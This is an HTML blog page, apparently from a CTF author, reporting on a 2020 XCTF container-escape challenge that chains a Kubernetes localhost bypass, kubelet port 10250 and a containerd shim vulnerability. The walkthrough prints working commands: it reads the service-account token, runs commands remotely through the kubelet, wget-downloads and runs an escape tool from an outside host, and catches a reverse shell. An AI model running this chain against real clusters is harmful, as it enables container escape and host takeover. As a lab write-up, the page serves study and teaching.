@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="">
+<meta name="description"
+    content="出题报告: nday_container_escape xctf-hwc_qualifier_2020/container/nday_container_escape
+2020年XCTF华为云专题赛线上赛中，出了一个容器相关的题目，记录一下。
+这类题目在国内比赛中还算少见（似乎是首次？），遗憾的是比赛结束时该题仍是0解，可能跟当天赛程非常紧凑有关。
+1. 背景 在筹备比赛题目的时间里，有一个新爆出的漏洞CVE-2020-15257比较火。漏洞出现在docker的关键组件containerd中，当一个容器拥有host网络命名空间时，可以导致容器逃逸。这首次揭示了network namespace的安全风险，具有一定的借鉴意义。
+但是，这个漏洞从实践层面上看又有一点鸡肋：
+ host网络通常较少在实际场景中出现（因为端口转发通常已足够使用） host网络在CIS docker基线中是一个禁止项，因此成熟的生产环境中，几乎不会出现该场景 即使使用了host网络的容器，不一定公网可访问，不一定存在命令执行漏洞  为此漏洞的利用场景受限感到惋惜的同时，我希望能构建一个更常用的环境，放大其利用场景。
+CVE-2020-8558就是一个绝佳的放大器(不起眼，实战中不一定修复)，该漏洞是由于kube-proxy默认设置了route_localnet，允许邻近主机绕过localhost边界。
+因此我们可能从一个非host网络容器逃逸！
+2. 环境搭建 根据上述分析，我们很容易可以构造这样一个贴近实战的漏洞利用链：CVE-2020-8558&amp;mdash;&amp;gt;k8s 10250&amp;mdash;&amp;gt;CVE-2020-15257
+其环境大致如下：
+我将上述环境搭建在了qemu里，选手可以ssh进入qemu中的容器内，发现漏洞并逃逸至qemu。
+上述qemu被封装在了一个docker镜像中（所以实际环境是一个docker in qemu in docker的环境），可以使用以下配置启动环境
+version: &#39;3&#39; services: challenge: image: swr.cn-north-1.myhuaweicloud.com/hwstaff_pub_pentest/ctf_nday_docker_escape:v0.1 ports: - &amp;quot;2222:22&amp;quot; 3. writeup 3.1 信息收集 以ctf/ctf进入环境，我们大致会看到这样一些信息，此时我们位于一个容器内，该容器由k8s启动的
+st0n3@yoga:~$ ./ctf.expect spawn ssh -o StrictHostKeyChecking=no ctf@1.2.3.4 ctf@1.2.3.4&#39;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-47-generic x86_64) ... &#43;&#43; sudo KUBECONFIG=/etc/kubernetes/admin.conf kubectl get pods --selector=app=ubuntu --template &#39;{{range ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/xctf_huaweicloud-qualifer-2020/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-nday_container_escape.html" />
+
+
+<title>
+    
+    出题报告: nday_container_escape :: welcome to st0n3&#39;s blog 
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.de959d61dd13c2cd41136acd491ffb0749779e1afe37b1fed6d5cba0b7e1938d.css">
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="theme-color" content="#252627"><meta itemprop="name" content="出题报告: nday_container_escape">
+<meta itemprop="description" content="出题报告: nday_container_escape xctf-hwc_qualifier_2020/container/nday_container_escape
+2020年XCTF华为云专题赛线上赛中，出了一个容器相关的题目，记录一下。
+这类题目在国内比赛中还算少见（似乎是首次？），遗憾的是比赛结束时该题仍是0解，可能跟当天赛程非常紧凑有关。
+1. 背景 在筹备比赛题目的时间里，有一个新爆出的漏洞CVE-2020-15257比较火。漏洞出现在docker的关键组件containerd中，当一个容器拥有host网络命名空间时，可以导致容器逃逸。这首次揭示了network namespace的安全风险，具有一定的借鉴意义。
+但是，这个漏洞从实践层面上看又有一点鸡肋：
+ host网络通常较少在实际场景中出现（因为端口转发通常已足够使用） host网络在CIS docker基线中是一个禁止项，因此成熟的生产环境中，几乎不会出现该场景 即使使用了host网络的容器，不一定公网可访问，不一定存在命令执行漏洞  为此漏洞的利用场景受限感到惋惜的同时，我希望能构建一个更常用的环境，放大其利用场景。
+CVE-2020-8558就是一个绝佳的放大器(不起眼，实战中不一定修复)，该漏洞是由于kube-proxy默认设置了route_localnet，允许邻近主机绕过localhost边界。
+因此我们可能从一个非host网络容器逃逸！
+2. 环境搭建 根据上述分析，我们很容易可以构造这样一个贴近实战的漏洞利用链：CVE-2020-8558&mdash;&gt;k8s 10250&mdash;&gt;CVE-2020-15257
+其环境大致如下：
+我将上述环境搭建在了qemu里，选手可以ssh进入qemu中的容器内，发现漏洞并逃逸至qemu。
+上述qemu被封装在了一个docker镜像中（所以实际环境是一个docker in qemu in docker的环境），可以使用以下配置启动环境
+version: &#39;3&#39; services: challenge: image: swr.cn-north-1.myhuaweicloud.com/hwstaff_pub_pentest/ctf_nday_docker_escape:v0.1 ports: - &quot;2222:22&quot; 3. writeup 3.1 信息收集 以ctf/ctf进入环境，我们大致会看到这样一些信息，此时我们位于一个容器内，该容器由k8s启动的
+st0n3@yoga:~$ ./ctf.expect spawn ssh -o StrictHostKeyChecking=no ctf@1.2.3.4 ctf@1.2.3.4&#39;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-47-generic x86_64) ... &#43;&#43; sudo KUBECONFIG=/etc/kubernetes/admin.conf kubectl get pods --selector=app=ubuntu --template &#39;{{range .">
+<meta itemprop="datePublished" content="2021-01-20T03:02:04+00:00" />
+<meta itemprop="dateModified" content="2021-01-20T03:02:04+00:00" />
+<meta itemprop="wordCount" content="813">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="出题报告: nday_container_escape"/>
+<meta name="twitter:description" content="出题报告: nday_container_escape xctf-hwc_qualifier_2020/container/nday_container_escape
+2020年XCTF华为云专题赛线上赛中，出了一个容器相关的题目，记录一下。
+这类题目在国内比赛中还算少见（似乎是首次？），遗憾的是比赛结束时该题仍是0解，可能跟当天赛程非常紧凑有关。
+1. 背景 在筹备比赛题目的时间里，有一个新爆出的漏洞CVE-2020-15257比较火。漏洞出现在docker的关键组件containerd中，当一个容器拥有host网络命名空间时，可以导致容器逃逸。这首次揭示了network namespace的安全风险，具有一定的借鉴意义。
+但是，这个漏洞从实践层面上看又有一点鸡肋：
+ host网络通常较少在实际场景中出现（因为端口转发通常已足够使用） host网络在CIS docker基线中是一个禁止项，因此成熟的生产环境中，几乎不会出现该场景 即使使用了host网络的容器，不一定公网可访问，不一定存在命令执行漏洞  为此漏洞的利用场景受限感到惋惜的同时，我希望能构建一个更常用的环境，放大其利用场景。
+CVE-2020-8558就是一个绝佳的放大器(不起眼，实战中不一定修复)，该漏洞是由于kube-proxy默认设置了route_localnet，允许邻近主机绕过localhost边界。
+因此我们可能从一个非host网络容器逃逸！
+2. 环境搭建 根据上述分析，我们很容易可以构造这样一个贴近实战的漏洞利用链：CVE-2020-8558&mdash;&gt;k8s 10250&mdash;&gt;CVE-2020-15257
+其环境大致如下：
+我将上述环境搭建在了qemu里，选手可以ssh进入qemu中的容器内，发现漏洞并逃逸至qemu。
+上述qemu被封装在了一个docker镜像中（所以实际环境是一个docker in qemu in docker的环境），可以使用以下配置启动环境
+version: &#39;3&#39; services: challenge: image: swr.cn-north-1.myhuaweicloud.com/hwstaff_pub_pentest/ctf_nday_docker_escape:v0.1 ports: - &quot;2222:22&quot; 3. writeup 3.1 信息收集 以ctf/ctf进入环境，我们大致会看到这样一些信息，此时我们位于一个容器内，该容器由k8s启动的
+st0n3@yoga:~$ ./ctf.expect spawn ssh -o StrictHostKeyChecking=no ctf@1.2.3.4 ctf@1.2.3.4&#39;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-47-generic x86_64) ... &#43;&#43; sudo KUBECONFIG=/etc/kubernetes/admin.conf kubectl get pods --selector=app=ubuntu --template &#39;{{range ."/>
+
+
+
+
+<meta property="article:published_time" content="2021-01-20 03:02:04 &#43;0000 UTC" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/st0n3</span>
+            <span class="logo__cursor"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/aboutme.html">About</a></li><li><a href="/post.html">Blog</a></li><li><a href="/hackerbot">Hackerbot</a></li><li><a href="/skill_tree/">SkillTree</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/xctf_huaweicloud-qualifer-2020/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-nday_container_escape.html">出题报告: nday_container_escape</a></h2>
+
+            
+
+            <div class="post-content">
+                <h1 id="出题报告-nday_container_escape">出题报告: nday_container_escape</h1>
+<p><small>xctf-hwc_qualifier_2020/container/nday_container_escape</small></p>
+<p>2020年XCTF华为云专题赛线上赛中，出了一个容器相关的题目，记录一下。</p>
+<p>这类题目在国内比赛中还算少见（似乎是首次？），遗憾的是比赛结束时该题仍是0解，可能跟当天赛程非常紧凑有关。</p>
+<h2 id="1-背景">1. 背景</h2>
+<p>在筹备比赛题目的时间里，有一个新爆出的漏洞CVE-2020-15257比较火。漏洞出现在docker的关键组件containerd中，当一个容器拥有host网络命名空间时，可以导致容器逃逸。这首次揭示了network namespace的安全风险，具有一定的借鉴意义。</p>
+<p>但是，这个漏洞从实践层面上看又有一点鸡肋：</p>
+<ol>
+<li>host网络通常较少在实际场景中出现（因为端口转发通常已足够使用）</li>
+<li>host网络在CIS docker基线中是一个禁止项，因此成熟的生产环境中，几乎不会出现该场景</li>
+<li>即使使用了host网络的容器，不一定公网可访问，不一定存在命令执行漏洞</li>
+</ol>
+<p>为此漏洞的利用场景受限感到惋惜的同时，我希望能构建一个更常用的环境，放大其利用场景。</p>
+<p>CVE-2020-8558就是一个绝佳的放大器(不起眼，实战中不一定修复)，该漏洞是由于kube-proxy默认设置了route_localnet，允许邻近主机绕过localhost边界。</p>
+<p>因此我们可能从一个非host网络容器逃逸！</p>
+<h2 id="2-环境搭建">2. 环境搭建</h2>
+<p>根据上述分析，我们很容易可以构造这样一个贴近实战的漏洞利用链：CVE-2020-8558&mdash;&gt;k8s 10250&mdash;&gt;CVE-2020-15257</p>
+<p>其环境大致如下：</p>
+<img src="http://img.st0n3.org/xctf_huaweicloud-qualifier-2020/upload_6105bd795f84c67aacd21f31a02a53aa.png" width="400px">
+<p>我将上述环境搭建在了qemu里，选手可以ssh进入qemu中的容器内，发现漏洞并逃逸至qemu。</p>
+<p>上述qemu被封装在了一个docker镜像中（所以实际环境是一个docker in qemu in docker的环境），可以使用以下配置启动环境</p>
+<pre><code>version: '3'
+services:
+        challenge:
+                image: swr.cn-north-1.myhuaweicloud.com/hwstaff_pub_pentest/ctf_nday_docker_escape:v0.1
+                ports:
+                        - &quot;2222:22&quot;
+</code></pre><h2 id="3-writeup">3. writeup</h2>
+<h3 id="31-信息收集">3.1 信息收集</h3>
+<p>以ctf/ctf进入环境，我们大致会看到这样一些信息，此时我们位于一个容器内，该容器由k8s启动的</p>
+<pre><code class="language-!" data-lang="!">st0n3@yoga:~$ ./ctf.expect 
+spawn ssh -o StrictHostKeyChecking=no ctf@1.2.3.4
+ctf@1.2.3.4's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-47-generic x86_64)
+...
+++ sudo KUBECONFIG=/etc/kubernetes/admin.conf kubectl get pods --selector=app=ubuntu --template '{{range .items}}{{.metadata.name}}{{end}}'
++ name=ubuntu-deployment-55786db8b8-qqmkf
+++ sudo docker ps -f name=k8s_ubuntu_ubuntu-deployment-55786db8b8-qqmkf --format '{{.Names}}'
++ container_name=k8s_ubuntu_ubuntu-deployment-55786db8b8-qqmkf_default_e4aaee57-ad1c-42eb-a0c0-a175bdaec7cd_6
++ sudo docker exec -ti -u root k8s_ubuntu_ubuntu-deployment-55786db8b8-qqmkf_default_e4aaee57-ad1c-42eb-a0c0-a175bdaec7cd_6 /bin/bash
+root@ubuntu-deployment-55786db8b8-qqmkf:/#
+root@ubuntu-deployment-55786db8b8-qqmkf:/# cat /proc/self/cgroup 
+12:pids:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+11:rdma:/
+10:devices:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+9:hugetlb:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+8:memory:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+7:perf_event:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+6:cpu,cpuacct:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+5:cpuset:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+4:freezer:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+3:blkio:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+2:net_cls,net_prio:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+1:name=systemd:/kubepods/besteffort/pode4aaee57-ad1c-42eb-a0c0-a175bdaec7cd/236cebd4929cca71dd991a39a8625f4f856422dbe690ad6b1261f80caf4418f7
+0::/system.slice/containerd.service
+</code></pre><p>因为看到了k8s相关的信息，所以我们可以条件反射式的找到k8s token</p>
+<pre><code class="language-!" data-lang="!">root@ubuntu-deployment-55786db8b8-qqmkf:/# cat /var/run/secrets/kubernetes.io/serviceaccount/token 
+eyJhbGciOiJSUzI1NiIsI...
+</code></pre><p>宿主机信息收集：</p>
+<pre><code class="language-!" data-lang="!">root@ubuntu-deployment-55786db8b8-qqmkf:/# sed -i &quot;s@http://.*ubuntu.com@http://repo.huaweicloud.com@g&quot; /etc/apt/sources.list
+root@ubuntu-deployment-55786db8b8-qqmkf:/# apt-get update &amp;&amp; apt-get install curl -y
+security-groupsroot@ubuntu-deployment-55786db8b8-qqmkf:/# curl http://169.254.169.254/latest/meta-data/local-ipv4
+192.168.1.117
+</code></pre><p>注意，以上查看宿主机ip的步骤在选手本地环境中无法实现（因为是模拟的云环境），但对宿主机网络进行探测的方式有很多种，不影响解题。</p>
+<p>此时我们可以对该ip上开启的服务进行探测</p>
+<pre><code class="language-!" data-lang="!">root@ubuntu-deployment-55786db8b8-qqmkf:~# nmap -F 192.168.1.117
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-21 03:16 UTC
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Ping Scan Timing: About 100.00% done; ETC: 03:16 (0:00:00 remaining)
+Nmap scan report for 192-168-1-117.kubernetes.default.svc.cluster.local (192.168.1.117)
+Host is up (0.0000040s latency).
+Not shown: 98 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><p>经过类似上述常规的思路进行信息收集后，我们还是觉得不太够。好在我们本地已有环境的所有内容。我们分析一下比赛提供给选手的本地镜像文件：</p>
+<pre><code class="language-!" data-lang="!">╰$ docker ps |grep escape                         
+d95748ab048b        swr.cn-north-1.myhuaweicloud.com/hwstaff_pub_pentest/ctf_nday_docker_escape:v0.1   &quot;/start_vm.sh&quot;           13 hours ago        Up 13 hours         0.0.0.0:2222-&gt;22/tcp                 downloads_challenge_1
+╰$ docker exec -ti -u root d95 bash               
+root@d95748ab048b:/# ls
+bin  boot  cloud.img  cloud.txt  dev  etc  home  init_qemu.expect  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  start_vm.sh  sys  tmp  ubuntu-20.04-server-cloudimg-amd64.img  usr  var
+</code></pre><p>其中，容器的启动文件为start_vm.sh，同时还有cloud.img, cloud.txt, ubuntu-20.04-server-cloudimg-amd64.img等与题目相关的文件。</p>
+<p>cloud.txt是环境搭建的具体配置，其中包括qemu的root密码及相关软件的版本（注意，真实环境root密码不同，此处密码仅供选手调试使用）</p>
+<pre><code>root@d95748ab048b:/# cat cloud.txt 
+#cloud-config
+user: root
+password: root
+....
+  - apt-get install -y docker.io kubelet=1.18.3-00 kubeadm=1.18.3-00 kubectl=1.18.3-00
+</code></pre><p>我们也可以直接重置qemu磁盘中的root密码，进入qemu。</p>
+<p>我们直接启动qemu，并以root用户进入qemu，以便我们更好的了解题目结构：</p>
+<pre><code># docker version
+Client:
+ Version:           19.03.8
+ API version:       1.40
+ Go version:        go1.13.8
+ Git commit:        afacb8b7f0
+ Built:             Wed Oct 14 19:43:43 2020
+ OS/Arch:           linux/amd64
+ Experimental:      false
+
+Server:
+ Engine:
+  Version:          19.03.8
+  API version:      1.40 (minimum version 1.12)
+  Go version:       go1.13.8
+  Git commit:       afacb8b7f0
+  Built:            Wed Oct 14 16:41:21 2020
+  OS/Arch:          linux/amd64
+  Experimental:     false
+ containerd:
+  Version:          1.3.3-0ubuntu2
+  GitCommit:        
+ runc:
+  Version:          spec: 1.0.1-dev
+  GitCommit:        
+ docker-init:
+  Version:          0.18.0
+  GitCommit:    
+root@ubuntu:~# kubelet --version
+Kubernetes v1.18.3
+</code></pre><h3 id="32-利用思路">3.2 利用思路</h3>
+<p>根据相关软件版本信息，我们可以发现以下漏洞</p>
+<ul>
+<li>k8s: CVE-2020-8558</li>
+<li>containerd: CVE-2020-15257</li>
+</ul>
+<p>但在我们初始进入的容器中，没有CVE-2020-15257必需的host network条件， 但在另一台nginx容器中发现使用了host network</p>
+<pre><code># kubectl get pods
+NAME                                 READY   STATUS    RESTARTS   AGE
+nginx-deployment-6dc88697bf-tkk6f    1/1     Running   6          3d1h
+ubuntu-deployment-55786db8b8-qqmkf   1/1     Running   6          3d
+root@hwc-ctf-nday-container-escape-with-flag:~# kubectl get pod nginx-deployment-6dc88697bf-tkk6f -o yaml
+...
+spec:
+  containers:
+  - image: nginx:1.14.2
+    imagePullPolicy: IfNotPresent
+    name: nginx
+    ports:
+    - containerPort: 80
+      hostPort: 80
+      protocol: TCP
+    resources: {}
+    terminationMessagePath: /dev/termination-log
+    terminationMessagePolicy: File
+    volumeMounts:
+    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+      name: default-token-2lcjs
+      readOnly: true
+  dnsPolicy: ClusterFirst
+  enableServiceLinks: true
+  hostNetwork: true
+...
+</code></pre><p>因此，如果我们可以移动到nginx容器上，则可以利用CVE-2020-15257实现逃逸。</p>
+<p>在k8s中移动，很自然得会想到需要一个跳板——k8s api</p>
+<pre><code># netstat -anp |grep kube
+tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      541/kubelet         
+tcp        0      0 127.0.0.1:10249         0.0.0.0:*               LISTEN      4219/kube-proxy     
+tcp        0      0 127.0.0.1:10250         0.0.0.0:*               LISTEN      541/kubelet         
+tcp        0      0 127.0.0.1:10257         0.0.0.0:*               LISTEN      2943/kube-controlle 
+tcp        0      0 127.0.0.1:10259         0.0.0.0:*               LISTEN      2921/kube-scheduler 
+tcp        0      0 127.0.0.1:46775         0.0.0.0:*               LISTEN      541/kubelet         
+...
+tcp6       0      0 :::6443                 :::*                    LISTEN      2934/kube-apiserver 
+tcp6       0      0 :::10251                :::*                    LISTEN      2921/kube-scheduler 
+tcp6       0      0 :::10252                :::*                    LISTEN      2943/kube-controlle 
+tcp6       0      0 :::10256                :::*                    LISTEN      4219/kube-proxy     
+tcp6       0      0 192.168.1.117:6443      10.244.0.22:40524       ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:4927      ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:45714     ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 ::1:6443                ::1:53110               ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      10.244.0.23:53220       ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:45776     ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 ::1:53110               ::1:6443                ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:45784     ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:45716     ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:45554     ESTABLISHED 2934/kube-apiserver 
+tcp6       0      0 192.168.1.117:6443      192.168.1.117:45556     ESTABLISHED 2934/kube-apiserver
+</code></pre><p>我们发现了127.0.0.1:10250和192.168.1.117:6443较为敏感，但经过尝试我们发现使用容器的token似乎无法访问apiserver的api</p>
+<pre><code>root@hwc-ctf-nday-container-escape-with-flag:~# curl -k https://192.168.1.117:6443/api/v1/pods -H &quot;Authorization: Bearer $token&quot;
+{
+  &quot;kind&quot;: &quot;Status&quot;,
+  &quot;apiVersion&quot;: &quot;v1&quot;,
+  &quot;metadata&quot;: {
+    
+  },
+  &quot;status&quot;: &quot;Failure&quot;,
+  &quot;message&quot;: &quot;pods is forbidden: User \&quot;system:serviceaccount:default:default\&quot; cannot list resource \&quot;pods\&quot; in API group \&quot;\&quot; at the cluster scope&quot;,
+  &quot;reason&quot;: &quot;Forbidden&quot;,
+  &quot;details&quot;: {
+    &quot;kind&quot;: &quot;pods&quot;
+  },
+  &quot;code&quot;: 403
+</code></pre><p>但可以使用10250</p>
+<pre><code>root@hwc-ctf-nday-container-escape-with-flag:~# curl -k https://127.0.0.1:10250/pods -H &quot;Authorization: Bearer $token&quot;
+{&quot;kind&quot;:&quot;PodList&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;items&quot;:[{&quot;metadata&quot;:{&quot;name&quot;:&quot;kube-proxy-wkq47&quot;,&quot;generateName&quot;:&quot;kube-proxy-&quot;,&quot;namespace&quot;:&quot;kube-system&quot;,&quot;selfLink&quot;:&quot;/api/v1/namespaces/kube-system/pods/kube-proxy-wkq47&quot;,&quot;uid&quot;:&quot;97f98bae-7c73-4fa2-b10c-769dc04728a1&quot;,&quot;resourceVersion&quot;:&quot;8616&quot;,&quot;creationTimestamp&quot;:&quot;2020-12-18T02:10:44Z&quot;,&quot;labels&quot;:{&quot;controller-revision-hash&quot;:&quot;6c749dc6c4&quot;,&quot;k8s-app&quot;:&quot;kube-proxy&quot;,&quot;pod-template-generation&quot;:&quot;1&quot;},&quot;annotations&quot;:{&quot;kubernetes.io/config.seen&quot;:&quot;2020-12-19T22:46:29.084763601+08:00&quot;,&quot;kubernetes.io/config.source&quot;:&quot;api&quot;},&quot;ownerReferences&quot;:[{&quot;apiVersion&quot;:&quot;apps/v1&quot;,&quot;kind&quot;:&quot;DaemonSet&quot;,&quot;name&quot;:&quot;kube-proxy&quot;,&quot;uid&quot;:&quot;47cbac3b-60f0-440e-b73d-079740a4bb46&quot;,&quot;controller&quot;:true,&quot;blockOwnerDele...
+</code></pre><p>因此我们可由10250移动至nginx</p>
+<p>但问题是10250是绑定在宿主机127.0.0.1上的，在容器内无法直接访问。这时我们可以很自然的联想到CVE-2020-8558。</p>
+<p>因此完整的利用链如下</p>
+<ol>
+<li>在ubuntu容器中利用CVE-2020-8558，访问宿主机127.0.0.1</li>
+<li>利用ubuntu容器中的token，访问宿主机的10250端口，横向移动至nginx容器</li>
+<li>在nginx容器中利用CVE-2020-15257逃逸至宿主机</li>
+</ol>
+<h3 id="33-完整利用过程">3.3 完整利用过程</h3>
+<pre><code>root@ubuntu-deployment-55786db8b8-qqmkf:/# sed -i &quot;s@http://.*ubuntu.com@http://repo.huaweicloud.com@g&quot; /etc/apt/sources.list
+root@ubuntu-deployment-55786db8b8-qqmkf:/# apt-get update 
+root@ubuntu-deployment-55786db8b8-qqmkf:/# apt-get install -y curl wget python3 python3-pip
+root@ubuntu-deployment-55786db8b8-qqmkf:/# pip3 install scapy
+root@ubuntu-deployment-55786db8b8-qqmkf:/# python3 poc-2020-8558.py 192.168.1.117 &amp;
+[1] 4414
+root@ubuntu-deployment-55786db8b8-qqmkf:/# token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) 
+root@ubuntu-deployment-55786db8b8-qqmkf:/# url=&quot;https://198.51.100.1:10250&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# api=&quot;/run/default/$target/nginx&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -k  $url/pods -H &quot;Authorization: Bearer $token&quot;
+{&quot;kind&quot;:&quot;PodList&quot;...
+root@ubuntu-deployment-55786db8b8-qqmkf:/# target=&quot;nginx-deployment-6dc88697bf-tkk6f&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -X POST -k  $url/run/default/$target/nginx -H &quot;Authorization: Bearer $token&quot; -d 'cmd=sed -i s@http://.*debian.org@http://repo.huaweicloud.com@g /etc/apt/sources.list'
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -X POST -k  $url/run/default/$target/nginx -H &quot;Authorization: Bearer $token&quot; -d &quot;cmd=apt-get update&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -X POST -k  $url/run/default/$target/nginx -H &quot;Authorization: Bearer $token&quot; -d &quot;cmd=apt-get install -y wget&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -X POST -k  $url/run/default/$target/nginx -H &quot;Authorization: Bearer $token&quot; -d &quot;cmd=wget https://1.2.3.4/cdk_linux_amd64&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -X POST -k  $url/run/default/$target/nginx -H &quot;Authorization: Bearer $token&quot; -d &quot;cmd=chmod -c 755 cdk_linux_amd64&quot;
+root@ubuntu-deployment-55786db8b8-qqmkf:/# curl -X POST -k  $url/run/default/$target/nginx -H &quot;Authorization: Bearer $token&quot; -d &quot;cmd=./cdk_linux_amd64 run shim-pwn 10.244.0.21 2333&quot;
+</code></pre><p>接收反弹shell</p>
+<pre><code>root@ubuntu-deployment-55786db8b8-qqmkf:/# nc -lvp 2333
+Listening on 0.0.0.0 2333
+Connection received on 10.244.0.1 46900
+bash: cannot set terminal process group (4366): Inappropriate ioctl for device
+bash: no job control in this shell
+&lt;f096a309f175a39f23fce68ffc0032ee64916c/merged/tmp# hostname
+hostname
+hwc-ctf-nday-container-escape-with-flag
+&lt;f096a309f175a39f23fce68ffc0032ee64916c/merged/tmp# cat /flag
+cat /flag
+flag{1ffc4afe-d52a-4476-ad00-1f5c8e9a063d}
+</code></pre><p>注：本文使用的相关cve的exp分别为：</p>
+<ul>
+<li><a href="https://github.com/tabbysable/POC-2020-8558">https://github.com/tabbysable/POC-2020-8558</a></li>
+<li><a href="https://www.cdxy.me/?p=837">https://www.cdxy.me/?p=837</a></li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  			</div>
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span></span>
